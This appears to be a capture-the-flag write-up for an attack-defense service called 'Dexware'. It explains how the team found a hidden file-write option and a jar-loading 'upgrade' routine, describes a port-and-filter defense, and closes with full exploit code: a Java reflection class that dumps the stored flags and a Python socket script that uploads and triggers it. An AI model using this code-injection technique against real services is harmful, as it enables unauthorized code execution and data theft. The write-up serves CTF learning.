@@ -1,0 +1,181 @@
+Dexware
+=======
+
+Dexware is a java program, namely a dex (Dalvik Executable-Format) compiled 
+java program.
+
+Disassemble
+===========
+The first thing was, that you have a dex file. This is an optimized java class 
+file. To decompile it, you have to find some tools on the internet (like 
+dex2jar). Then you have to decompile the given class file to java code (e.g. 
+with jad).
+
+Next you can view the code with whatever editor you like (we took eclipse, 
+because of syntax highlighting and other fancy stuff). Next thing was to check 
+the program for strange things and we found one.
+When displaying the menu you can choose a number. The decompiled code reveals a 
+hidden number, namely 42 (woooo). After checking and understanding the code, we 
+found out, that the secret 42 takes as arguments a filename with ending, a 
+number and a sequence of hex values. 
+After checking that everything is valid it puts the hex string into a file a 
+saves it under the filename. But because the flags won't be placed on the hard 
+disk, we didn't see any attack vector here.
+But locking for more, we found the suspect option 'upgrade'. Because it doesn't 
+do anything at first sight we investigated the code and found something very 
+interesting.
+
+The upgrade method loops through all files in the /tmp/dexware directory (that 
+directory we can place files into), looks for '.jar' files and tries to execute 
+them. This was a big step! We found an attack vector.
+Next step is to find out how to inject our code. When looking at the source, we 
+can see that it looks for a 'DexWareUpgrader' class with an method 'upgrade' 
+and two parameter, an object and a string. So let's code something. We compiled 
+a simple java program with a sysout("Hello") and check how we have to compile 
+and arrange it, that this will be executed. This was a tough process.
+The solution is to compile the java programm into a class file, use dx (you 
+need the android-sdk for it) to make a .dex file out of it, then zip it, rename 
+it to '8#something.jar' and put it into '/tmp/dexware'. The 8 is the a thread 
+id, but that's nothing we have to care about. After a lot of error messages we 
+finally got our success message "Hello". We were a little bit happy :)
+Next step is to use a lot of reflection to get the formulas, which is our main 
+goal. To see how we accomplished it, look at the code in the appendix.
+
+Exploit
+=======
+Remember what 42 does and with this knowledge in mind we can now write an 
+exploit (see appendix for code)
+We use open('exploit.jar').read() to put the hexcode in our exp.py. Next we use 
+'binascii' modul to convert the input hex a hex-string and send the server the 
+needed information.
+At first 42, then a filename with .jar at the end (this is our defense point), 
+then the length of the file and at last the hexcode. Then use 4 to execute the 
+exploit and get the needed information. We easily can split the input stream 
+via the '@' and ':' sign. Last is to filter out the right formula, that was 
+easy.
+
+
+Defense
+=======
+We wrote ourself a little proxy script that redirects the whole input stream 
+from one port to an other, but with a filter option. So the first was to change 
+the hardcoded port of dexware from 8085 to something else like 8086. 
+Opening a hex-editor and search for 1F95 reveals one location. We changed it to 
+1F96 and tried to execute it. No luck here, because of a bad checksum. Some 
+research on the internet shows us a little program that calculates a new 
+checksum. Bit fiddly, but it does a good job.
+Next step was to setup the filter. Because we know, what you have to put in a 
+'.jar' file, be grepped for '.jar' and closed that connecion.
+
+
+Summary
+=======
+This was an amusing challange, that hasn't anything to do with an ELF. It was 
+tricky and not that easy to solve. Even after you know the attack vector it was 
+a lot of work to access the needed information. All in all very good, thank you! 
+:)
+
+
+
+DexWareUpgrader
+===============
+
+import java.io.BufferedWriter;
+import java.lang.reflect.Field;
+import java.util.Map;
+import java.util.concurrent.ConcurrentHashMap;
+
+public class DexWareUpgrader
+{
+    @SuppressWarnings("rawtypes")
+    public static final void upgrade(Object obj, String s) throws Throwable
+    {   
+        Field fOuter = obj.getClass().getDeclaredField("this$0");
+        fOuter.setAccessible(true);
+        Object dexware = fOuter.get(obj);
+        
+        Field fFormDB = dexware.getClass().getDeclaredField("formulasDB");
+        fFormDB.setAccessible(true);
+        Object formDB = fFormDB.get(dexware);
+        
+        Field fHashmap = formDB.getClass().getDeclaredField("formulas");
+        fHashmap.setAccessible(true);
+        ConcurrentHashMap map = (ConcurrentHashMap)fHashmap.get(formDB);
+        
+        Field fFormId = dexware.getClass().getDeclaredClasses()[0].getDeclaredField("formulaId"); //[0] is the FormulaEntry class
+        fFormId.setAccessible(true);
+        
+        Field fForm = dexware.getClass().getDeclaredClasses()[0].getDeclaredField("formula");
+        fForm.setAccessible(true);
+        
+        Field bufOut = obj.getClass().getDeclaredField("out");
+        bufOut.setAccessible(true);
+        BufferedWriter out = (BufferedWriter)bufOut.get(obj);
+
+        for(Object o : map.entrySet())
+        {
+            Map.Entry me = (Map.Entry)o;
+            String innerS = (String)me.getKey();
+            out.write(fFormId.get(map.get(innerS)) + ":" + fForm.get(map.get(innerS)) + "@");
+        }
+    }
+}
+
+dex_ex.py
+=========
+
+import socket
+import binascii
+import time
+
+code = open('exp.jar', 'rb').read()
+
+codehex = binascii.hexlify(code)
+codelen = len(codehex)
+
+class Exploit():
+    def execute(self, ip, port, flag_id):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, port))
+        s.recv(4096)
+        s.sendall('42\n')
+        s.recv(4096)
+        s.sendall('wIFd.jar\n')
+        s.recv(4096)
+        s.sendall('{0}\n'.format(codelen))
+        s.recv(4096)
+        s.sendall(codehex + '\n')
+        s.recv(4096)
+        s.sendall('4\n')
+        time.sleep(2)
+        data = ''
+        s.setblocking(0)
+        while True:
+            try:
+                buf = s.recv(512)
+            except socket.error:
+                break
+            data += buf
+        s.setblocking(1)
+        flag = None
+        lines = data.split('\n')
+        for line in lines:
+            if '@' not in line:
+                continue
+            for el in line.split('@'):
+                try:
+                    my_id, my_flag = el.split(':')
+                    my_id = my_id.strip()
+                    my_flag = my_flag.strip().strip('@')
+                    if my_id == flag_id:
+                        flag = my_flag
+                except ValueError:
+                    continue
+
+        if flag is None:
+            raise ValueError(data)
+
+        self.flag = flag
+    
+    def result(self):
+        return {'FLAG' : self.flag }
